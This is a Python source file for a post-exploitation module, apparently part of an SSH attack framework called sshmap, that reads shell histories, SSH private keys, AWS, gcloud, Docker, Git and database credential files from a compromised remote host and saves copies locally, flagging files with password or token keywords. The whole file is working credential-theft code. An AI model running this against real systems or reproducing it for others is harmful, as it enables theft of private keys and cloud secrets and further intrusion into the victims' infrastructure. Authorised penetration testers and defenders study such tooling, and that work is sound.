"""Module for harvesting credentials from various sources on the remote host."""
import os
from typing import Dict, Any
from modules.post_exploitation.base_module import BasePostExploitationModule
from modules.logger import sshmap_logger


class CredentialHarvesterModule(BasePostExploitationModule):
    """
    Harvests credentials from common locations on the remote host.
    
    Searches for credentials in:
    - Shell history files (.bash_history, .zsh_history, etc.)
    - SSH configuration and keys
    - Configuration files (.netrc, .my.cnf, etc.)
    - Environment files
    """
    
    # Maximum file size to read (50KB)
    MAX_FILE_SIZE = 50000
    
    @property
    def name(self) -> str:
        return "credential_harvester"
    
    @property
    def description(self) -> str:
        return "Harvest credentials from history, config files, and user home directory"
    
    async def execute(self, ssh_session, output_dir: str) -> Dict[str, Any]:
        """Execute credential harvesting on the remote host."""
        try:
            hostname = ssh_session.get_remote_hostname()
            sshmap_logger.info(f"[{self.name}] Starting credential harvesting on {hostname}")
            
            results = {
                "success": True,
                "hostname": hostname,
                "data": {
                    "history_files": [],
                    "config_files": [],
                    "ssh_keys": [],
                    "credentials_found": []
                },
                "error": None
            }
            
            # Define files to search for
            files_to_check = [
                # Shell history files
                "~/.bash_history",
                "~/.zsh_history",
                "~/.sh_history",
                "~/.history",
                # SSH related
                "~/.ssh/config",
                "~/.ssh/id_rsa",
                "~/.ssh/id_dsa",
                "~/.ssh/id_ecdsa",
                "~/.ssh/id_ed25519",
                "~/.ssh/authorized_keys",
                # Configuration files with potential credentials
                "~/.netrc",
                "~/.my.cnf",
                "~/.pgpass",
                "~/.aws/credentials",
                "~/.config/gcloud/credentials.db",
                "~/.docker/config.json",
                "~/.git-credentials",
                "~/.gitconfig",
                # Environment files
                "~/.bashrc",
                "~/.zshrc",
                "~/.profile",
                "~/.bash_profile",
            ]
            
            # Check which files exist
            for file_path in files_to_check:
                try:
                    check_cmd = f"test -f {file_path} && echo 'EXISTS' || echo 'NOT_FOUND'"
                    output = await ssh_session.exec_command(check_cmd)
                    
                    if "EXISTS" in output:
                        # Try to read the file (with size limit for safety)
                        read_cmd = f"head -c {self.MAX_FILE_SIZE} {file_path} 2>/dev/null || echo 'PERMISSION_DENIED'"
                        content = await ssh_session.exec_command(read_cmd)
                        
                        if "PERMISSION_DENIED" not in content:
                            # Save the file
                            safe_filename = file_path.replace("/", "_").replace("~", "home")
                            output_file = os.path.join(output_dir, f"{hostname}_{safe_filename}")
                            
                            with open(output_file, "w") as f:
                                f.write(f"# File: {file_path}\n")
                                f.write(f"# Host: {hostname}\n\n")
                                f.write(content)
                            
                            # Categorize the file
                            if "history" in file_path:
                                results["data"]["history_files"].append(file_path)
                            elif ".ssh/" in file_path:
                                results["data"]["ssh_keys"].append(file_path)
                            else:
                                results["data"]["config_files"].append(file_path)
                            
                            sshmap_logger.debug(f"[{self.name}] Found and saved: {file_path}")
                            
                            # Basic credential pattern detection
                            if self._contains_credentials(content):
                                results["data"]["credentials_found"].append(file_path)
                
                except Exception as e:
                    sshmap_logger.debug(f"[{self.name}] Error checking {file_path}: {e}")
                    continue
            
            # Summary
            total_files = (len(results["data"]["history_files"]) + 
                          len(results["data"]["config_files"]) + 
                          len(results["data"]["ssh_keys"]))
            
            sshmap_logger.display(
                f"[{self.name}] Harvested {total_files} files from {hostname}. "
                f"Found potential credentials in {len(results['data']['credentials_found'])} files."
            )
            
            return results
            
        except Exception as e:
            sshmap_logger.error(f"[{self.name}] Failed to harvest credentials: {e}")
            return {
                "success": False,
                "hostname": hostname if 'hostname' in locals() else "unknown",
                "data": None,
                "error": str(e)
            }
    
    def _contains_credentials(self, content: str) -> bool:
        """Check if content contains potential credential patterns."""
        # Simple pattern matching for common credential indicators
        credential_keywords = [
            "password", "passwd", "pwd", "secret", "token", "api_key",
            "apikey", "access_key", "private_key", "auth", "credential"
        ]
        content_lower = content.lower()
        return any(keyword in content_lower for keyword in credential_keywords)
